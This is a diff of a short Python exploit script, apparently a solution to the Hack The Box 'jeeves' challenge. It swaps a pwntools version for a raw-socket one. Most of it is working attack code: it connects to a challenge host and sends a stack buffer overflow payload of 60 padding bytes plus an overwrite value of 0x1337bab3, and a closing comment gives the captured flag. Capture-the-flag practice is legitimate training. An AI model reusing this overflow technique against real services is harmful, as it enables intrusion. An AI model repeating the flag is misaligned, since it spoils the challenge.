@@ -1,17 +1,17 @@
-from pwn import *
+import socket
 
-#cyclic
-payload = b'A'*(60) + p32(0x1337bab3)
+HOST = "104.248.175.144"
+PORT = 31406
 
-#io = process('./jeeves')
-io = process('nc')
-io.sendline(b'138.68.183.154 30432')
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-#io.sendlineafter('?', payload)
-#io.recvuntil(b'May I have your name? ')
-io.sendline(payload)
+try:
+	sock.connect((HOST,PORT))
+	data = b"A"*60 + b"\xb3\xba\x37\x13\n"
+	sock.send(data)
+	dataFromServer = sock.recv(1024)
+	print(dataFromServer)
+except socket.error:
+	print("Failed to send data")
 
-print(io.recvline())
-print(io.recvline())
-'''
-'''
+#HTB{w3lc0me_t0_lAnd_0f_pwn_&_pa1n!}
